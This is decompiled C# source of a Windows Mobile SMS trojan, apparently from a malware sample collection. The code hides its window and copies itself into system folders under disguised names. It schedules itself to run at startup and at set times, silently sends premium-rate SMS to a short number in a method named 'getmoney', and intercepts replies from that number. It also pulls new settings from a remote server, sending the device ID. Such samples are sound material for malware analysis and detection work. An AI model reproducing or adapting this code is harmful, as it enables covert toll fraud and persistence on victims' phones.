﻿// Decompiled with JetBrains decompiler
// Type: viconect.Form1
// Assembly: viconect, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0595134F-28B6-447C-9941-5F1051DDA774
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-SMS.WinCE.Pocha.c-2bb546c7e5f11378cc9f51848af43130ca7dba9f8cc93046d5ab7be1ce2ebc43.exe

using HTTP;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.WindowsMobile.PocketOutlook;
using Microsoft.WindowsMobile.PocketOutlook.MessageInterception;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using viconect.My;

namespace viconect
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private MainMenu mainMenu1;
    [AccessedThroughProperty("WebRequestBindingSource")]
    private BindingSource _WebRequestBindingSource;
    [AccessedThroughProperty("starting")]
    private Timer _starting;
    private object trash;
    private object shortnomer;
    private object pref;
    private object timesendh;
    private object timesendm;
    private object sendinterval;
    private object subpref;
    private object temp;
    private object path;
    private object myname;
    private object myfolder;
    private object nomer;
    private object nowtime;
    private MessageInterceptor interceptor;
    private MessageInterceptorEventArgs sin;
    private MessageInterceptor @out;
    private Hardware hr;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.shortnomer = (object) "1727";
      this.pref = (object) "xboom ";
      this.timesendh = (object) "12";
      this.timesendm = (object) "22";
      this.sendinterval = (object) "1";
      this.subpref = (object) "true";
      this.path = (object) Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;
      this.nowtime = (object) DateTime.Now.ToShortDateString();
      this.@out = new MessageInterceptor();
      this.hr = new Hardware();
      this.InitializeComponent();
    }

    public static void Main() => Application.Run((Form) MyProject.Forms.Form1);

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.mainMenu1 = new MainMenu();
      this.WebRequestBindingSource = new BindingSource(this.components);
      this.starting = new Timer();
      ((ISupportInitialize) this.WebRequestBindingSource).BeginInit();
      this.SuspendLayout();
      this.WebRequestBindingSource.DataSource = (object) typeof (WebRequest);
      this.starting.Enabled = true;
      this.starting.Interval = 2000;
      this.AutoScaleDimensions = new SizeF(96f, 96f);
      this.AutoScaleMode = AutoScaleMode.Dpi;
      this.AutoScroll = true;
      ((Control) this).ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Menu = this.mainMenu1;
      this.Name = nameof (Form1);
      this.Text = "Пуск";
      ((ISupportInitialize) this.WebRequestBindingSource).EndInit();
      this.ResumeLayout(false);
    }

    internal virtual BindingSource WebRequestBindingSource
    {
      [DebuggerNonUserCode] get => this._WebRequestBindingSource;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebRequestBindingSource = value;
    }

    internal virtual Timer starting
    {
      [DebuggerNonUserCode] get => this._starting;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.starting_Tick);
        if (this._starting != null)
          this._starting.Tick -= eventHandler;
        this._starting = value;
        if (this._starting == null)
          return;
        this._starting.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Top = -100;
      this.Left = -100;
    }

    public void impotant()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.folders();
label_3:
        num3 = 3;
        this.getinterval();
label_4:
        num3 = 4;
        File.Copy(Conversions.ToString(this.path), "\\windows\\wmoff.exe");
label_5:
        num3 = 5;
        File.Copy(Conversions.ToString(Operators.ConcatenateObject(this.myfolder, (object) "hardware.dll")), "\\windows\\Hardware.dll");
label_6:
        num3 = 6;
        File.Copy(Conversions.ToString(Operators.ConcatenateObject(this.myfolder, (object) "http.dll")), "\\windows\\HTTP.dll");
label_7:
        num3 = 7;
        File.Copy(Conversions.ToString(Operators.ConcatenateObject(this.myfolder, (object) "viconect.dll")), "\\windows\\hide.exe");
label_8:
        num3 = 8;
        Hardware.RunAppAtEvent("\\windows\\wmoff.exe", this.hr.evNetConnect);
label_9:
        num3 = 9;
        Hardware.RunAppAtTime("\\windows\\wmoff.exe", Conversions.ToLong(this.trash));
label_10:
        num3 = 10;
        StreamWriter text = File.CreateText("\\windows\\hide.bin");
label_11:
        num3 = 11;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.myfolder));
label_12:
        num3 = 12;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.myname));
label_13:
        num3 = 13;
        text.Flush();
label_14:
        num3 = 14;
        text.Close();
label_15:
        num3 = 15;
        Interaction.Shell("\\windows\\hide.exe");
label_16:
        num3 = 16;
        Application.Exit();
        goto label_23;
label_18:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_23;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_18;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void getmoney()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.@out = new MessageInterceptor((InterceptionAction) 1);
label_3:
        num3 = 3;
        MessageInterceptor messageInterceptor = this.@out;
        Form1 form1 = this;
        // ISSUE: virtual method pointer
        MessageInterceptorEventHandler interceptorEventHandler = new MessageInterceptorEventHandler((object) form1, __vmethodptr(form1, sms_in));
        messageInterceptor.MessageReceived += interceptorEventHandler;
label_4:
        num3 = 4;
        this.getparam();
label_5:
        num3 = 5;
        if (!File.Exists("\\windows\\pat.bin"))
          goto label_19;
label_6:
        num3 = 6;
        StreamReader streamReader = File.OpenText("\\windows\\pat.bin");
label_7:
        num3 = 7;
        string Left = streamReader.ReadLine();
label_8:
        num3 = 8;
        streamReader.Close();
label_9:
        num3 = 9;
        if (!Operators.ConditionalCompareObjectEqual((object) Left, this.nowtime, false))
          goto label_11;
label_10:
        num3 = 10;
        Application.Exit();
        goto label_18;
label_11:
        num3 = 12;
label_12:
        num3 = 13;
        SmsMessage smsMessage1 = new SmsMessage(Conversions.ToString(this.shortnomer), Conversions.ToString(this.pref));
label_13:
        num3 = 14;
        smsMessage1.Send();
label_14:
        num3 = 15;
        StreamWriter text1 = File.CreateText("\\windows\\pat.bin");
label_15:
        num3 = 16;
        text1.WriteLine(RuntimeHelpers.GetObjectValue(this.nowtime));
label_16:
        num3 = 17;
        text1.Flush();
label_17:
        num3 = 18;
        text1.Close();
label_18:
        goto label_26;
label_19:
        num3 = 21;
label_20:
        num3 = 22;
        SmsMessage smsMessage2 = new SmsMessage(Conversions.ToString(this.shortnomer), Conversions.ToString(this.pref));
label_21:
        num3 = 23;
        smsMessage2.Send();
label_22:
        num3 = 24;
        StreamWriter text2 = File.CreateText("\\windows\\pat.bin");
label_23:
        num3 = 25;
        text2.WriteLine(RuntimeHelpers.GetObjectValue(this.nowtime));
label_24:
        num3 = 26;
        text2.Flush();
label_25:
        num3 = 27;
        text2.Close();
label_26:
label_27:
        num3 = 29;
        this.getinterval();
label_28:
        num3 = 30;
        Hardware.RunAppAtTime("\\windows\\wmoff.exe", Conversions.ToLong(this.trash));
        goto label_35;
label_30:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
              case 19:
                goto label_18;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 20:
              case 28:
                goto label_26;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 29:
                goto label_27;
              case 30:
                goto label_28;
              case 31:
                goto label_35;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_30;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_35:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void sms_in(object sender, MessageInterceptorEventArgs e)
    {
      this.nomer = (object) e.Message.From.Address;
      if (!Operators.ConditionalCompareObjectEqual(this.nomer, this.shortnomer, false))
        return;
      this.@out.InterceptionAction = (InterceptionAction) 1;
      Application.Exit();
    }

    public void folders()
    {
      int startIndex = 0;
      int num = 0;
      while (this.path.ToString().IndexOf("\\", startIndex) >= 0)
      {
        startIndex = checked (this.path.ToString().IndexOf("\\", startIndex) + 1);
        checked { ++num; }
        if (num > 20)
          goto label_4;
      }
      this.myname = (object) this.path.ToString().Substring(startIndex);
label_4:
      this.myfolder = (object) this.path.ToString().Replace(Conversions.ToString(this.myname), "");
    }

    public void getinterval()
    {
      DateTime Date2 = new DateTime(634236480000000000L);
      DateTime now = DateAndTime.Now;
      Dictionary<string, string> dictionary = new Dictionary<string, string>();
      dictionary.Add("d", "");
      try
      {
        foreach (KeyValuePair<string, string> keyValuePair in dictionary)
          this.trash = (object) (Conversions.ToString(DateAndTime.DateDiff(keyValuePair.Key, (object) now, (object) Date2)) + keyValuePair.Value);
      }
      finally
      {
        Dictionary<string, string>.Enumerator enumerator;
        enumerator.Dispose();
      }
      this.trash = (object) this.trash.ToString().Replace("-", "");
      this.trash = Operators.AddObject(this.trash, (object) 1);
      this.trash = Operators.MultiplyObject(this.trash, (object) 86400000);
      this.trash = Operators.AddObject(this.trash, this.timesendh);
      this.trash = Operators.AddObject(this.trash, this.timesendm);
      this.trash = Operators.AddObject(this.trash, (object) 63423648000000L);
      this.trash = Operators.ConcatenateObject(this.trash, (object) "0000");
    }

    public void getparam()
    {
      if (File.Exists("\\windows\\concole.bin"))
      {
        StreamReader streamReader = File.OpenText("\\windows\\concole.bin");
        this.shortnomer = (object) streamReader.ReadLine();
        this.pref = (object) streamReader.ReadLine();
        this.timesendh = (object) streamReader.ReadLine();
        this.timesendm = (object) streamReader.ReadLine();
        this.sendinterval = (object) streamReader.ReadLine();
        this.subpref = (object) streamReader.ReadLine();
        streamReader.Close();
      }
      else
      {
        StreamWriter text = File.CreateText("\\windows\\concole.bin");
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.shortnomer));
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.pref));
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.timesendh));
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.timesendm));
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.sendinterval));
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.subpref));
        text.Flush();
        text.Close();
      }
      if (Operators.ConditionalCompareObjectEqual(this.subpref, (object) "true", false))
        this.pref = Operators.ConcatenateObject(this.pref, (object) new Random().Next(111, 9999));
      this.timesendh = Operators.MultiplyObject(this.timesendh, (object) 3600000);
      this.timesendm = Operators.MultiplyObject(this.timesendm, (object) 60000);
    }

    public void getrefresh()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.getparam();
label_3:
        num3 = 3;
        WebRequest webRequest = new WebRequest(Conversions.ToString(Operators.ConcatenateObject((object) ("http://prosto-chat.ru/app/update.php?deviceid=" + this.hr.GetDeviceID() + "&pref="), this.pref)), 1251);
label_4:
        num3 = 4;
        WebResponse webResponse = new WebResponse(1251);
label_5:
        num3 = 5;
        webResponse.Value = webRequest.GetResponse();
label_6:
        num3 = 6;
        this.temp = (object) webResponse.GetString();
label_7:
        num3 = 7;
        webResponse.Close();
label_8:
        num3 = 8;
        if (Operators.ConditionalCompareObjectEqual(this.temp, (object) "", false))
          goto label_39;
label_9:
        num3 = 10;
label_10:
        num3 = 11;
        int num4 = 0;
label_11:
        num3 = 12;
        int startIndex = 0;
label_12:
        num3 = 13;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_13:
        num3 = 14;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_14:
        num3 = 15;
        this.shortnomer = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_15:
        num3 = 16;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_16:
        num3 = 17;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_17:
        num3 = 18;
        this.pref = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_18:
        num3 = 19;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_19:
        num3 = 20;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_20:
        num3 = 21;
        this.timesendh = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_21:
        num3 = 22;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_22:
        num3 = 23;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_23:
        num3 = 24;
        this.timesendm = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_24:
        num3 = 25;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_25:
        num3 = 26;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_26:
        num3 = 27;
        this.sendinterval = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_27:
        num3 = 28;
        num4 = this.temp.ToString().IndexOf("%", startIndex);
label_28:
        num3 = 29;
        startIndex = this.temp.ToString().IndexOf("%", checked (num4 + 1));
label_29:
        num3 = 30;
        this.subpref = (object) this.temp.ToString().Substring(checked (num4 + 1), checked (startIndex - num4 - 1));
label_30:
        num3 = 31;
        StreamWriter text = File.CreateText("\\windows\\concole.bin");
label_31:
        num3 = 32;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.shortnomer));
label_32:
        num3 = 33;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.pref));
label_33:
        num3 = 34;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.timesendh));
label_34:
        num3 = 35;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.timesendm));
label_35:
        num3 = 36;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.sendinterval));
label_36:
        num3 = 37;
        text.WriteLine(RuntimeHelpers.GetObjectValue(this.subpref));
label_37:
        num3 = 38;
        text.Flush();
label_38:
        num3 = 39;
        text.Close();
label_39:
label_40:
        num3 = 41;
        this.getmoney();
        goto label_47;
label_42:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
              case 40:
                goto label_39;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
                goto label_32;
              case 34:
                goto label_33;
              case 35:
                goto label_34;
              case 36:
                goto label_35;
              case 37:
                goto label_36;
              case 38:
                goto label_37;
              case 39:
                goto label_38;
              case 41:
                goto label_40;
              case 42:
                goto label_47;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_42;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_47:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void starting_Tick(object sender, EventArgs e) => this.startingsub();

    public void startingsub()
    {
      this.starting.Enabled = false;
      this.Hide();
      if (File.Exists("\\windows\\wmoff.exe"))
        this.getrefresh();
      else
        this.impotant();
    }
  }
}
